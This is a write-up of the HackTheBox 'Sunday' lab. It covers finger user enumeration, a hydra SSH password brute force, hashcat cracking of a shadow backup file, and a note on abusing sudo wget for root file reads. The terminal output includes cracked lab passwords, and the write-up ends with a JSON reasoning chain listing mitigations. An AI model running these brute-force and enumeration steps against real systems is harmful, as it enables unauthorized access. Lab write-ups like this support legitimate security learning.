# HTB Sunday - Finger Enumeration, SSH Credential Recovery, and Sudo wget Abuse

Scope: authorized HTB lab only.
Focus: user enumeration via Finger, SSH access through credential cracking, and privileged file access through sudo misconfiguration.

---

## 1. Investigation Objective

1. Identify exposed and non-standard services.
2. Enumerate valid local usernames remotely.
3. Obtain initial SSH foothold.
4. Analyze privilege boundaries and backup artifacts.
5. Leverage sudo misconfiguration for root-level data access.

---

## 2. Recon and User Enumeration

Initial scan:

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

Important finding:
- Finger service on 79/tcp.

Enumerate users:

```bash
finger @<TARGET_IP>
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>
```

Recovered usernames in common path:
- `sunny`
- `sammy`
- `root`

Run full-port scan to identify alternate SSH port:

```bash
nmap -sC -sV -Pn -p- <TARGET_IP>
```

SSH discovered on `22022/tcp`.

---

## 3. Initial Access via SSH Credential Discovery

Credential attack in lab context:

```bash
hydra -l sunny -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -s 22022 -t 4
```

Recovered credential:
- `sunny : sunday`

Login:

```bash
ssh sunny@<TARGET_IP> -p 22022
```

---

## 4. Local Enumeration and Secondary Credential Pivot

From `sunny`, inspect sudo rights and backup data:

```bash
sudo -l
find / -name "*backup*" 2>/dev/null
```

If password hashes are discovered in backup artifacts, crack offline and pivot to `sammy`.

Hash cracking example from workflow:

```bash
hashcat -m 7400 <HASH_FILE> /usr/share/wordlists/rockyou.txt --force
```

Recovered credential in this path:
- `sammy : cooldude!`

Pivot:

```bash
su sammy
cat /home/sammy/user.txt
```

---

## 5. Privilege Escalation via sudo wget Behavior

Evaluate `sammy` sudo entries:

```bash
sudo -l
```

When `wget` is allowed as root, privileged file read/exfiltration becomes possible (per GTFOBins patterns), enabling root artifact retrieval without full interactive root shell.

---

## 6. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -Pn 10.10.10.76
PORT     STATE SERVICE VERSION
79/tcp   open  finger  Solaris fingerd

analyst@kali:~$ ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
[+] Found username: sunny
[+] Found username: sammy

analyst@kali:~$ nmap -sC -sV -Pn -p- 10.10.10.76
22022/tcp open ssh OpenSSH ...

analyst@kali:~$ hydra -l sunny -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.76 -s 22022 -t 4
[22022][ssh] host: 10.10.10.76 login: sunny password: sunday

analyst@kali:~$ ssh sunny@10.10.10.76 -p 22022
sunny@sunday:~$ sudo -l
... limited allowed commands ...

sunny@sunday:~$ ls /backup
shadow.backup

analyst@kali:~$ hashcat -m 7400 hashes.txt /usr/share/wordlists/rockyou.txt --force
... sammy:cooldude! ...

sunny@sunday:~$ su sammy
Password: cooldude!
sammy@sunday:~$ sudo -l
(root) NOPASSWD: /usr/bin/wget
```

---

## 7. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "sunday_finger_enum_to_ssh_and_sudo_wget_privileged_read",
	"input_signals": [
		"Finger service exposed and discloses valid usernames",
		"SSH available on non-standard port 22022",
		"sunny account password recovered via wordlist attack",
		"Backup artifact contains crackable credential material",
		"sammy has sudo rights enabling wget as root"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "User Account Discovery",
			"confidence": 0.93,
			"evidence": "finger-user-enum identified valid accounts"
		},
		{
			"step": 2,
			"tactic": "credential_access",
			"technique": "Brute Force / Password Cracking",
			"confidence": 0.88,
			"evidence": "hydra and hashcat recovered sunny and sammy credentials"
		},
		{
			"step": 3,
			"tactic": "initial_access",
			"technique": "Valid Accounts",
			"confidence": 0.9,
			"evidence": "SSH login succeeded on 22022"
		},
		{
			"step": 4,
			"tactic": "privilege_escalation",
			"technique": "Sudo Misconfiguration",
			"confidence": 0.84,
			"evidence": "sudo permitted wget execution as root"
		}
	],
	"hypotheses": [
		"Additional accounts may be enumerable through legacy finger data",
		"Backup handling process likely leaks sensitive auth material regularly",
		"Other sudo-allowed binaries may enable direct root shell execution"
	],
	"uncertainties": [
		"Exact root shell route via wget not validated in this transcript",
		"Password policy scope across all users is unknown",
		"Unknown if failed brute-force attempts are monitored"
	],
	"tool_calls": [
		{"name": "legacy_finger_exposure_checker", "priority": "high"},
		{"name": "credential_backup_leak_scanner", "priority": "high"},
		{"name": "sudo_gtfobin_risk_mapper", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Disable finger service on external interfaces",
			"Rotate credentials exposed via backup files",
			"Remove unnecessary sudo permission for network/file transfer binaries"
		],
		"hardening": [
			"Enforce strong password policy and account lockout controls",
			"Protect backups with encryption and strict access controls",
			"Move SSH back to tightly controlled management networks"
		],
		"monitoring": [
			"Alert on username enumeration and repeated SSH auth failures",
			"Monitor access to backup directories and hash-containing files",
			"Track sudo execution of wget and outbound data transfer anomalies"
		]
	}
}
```

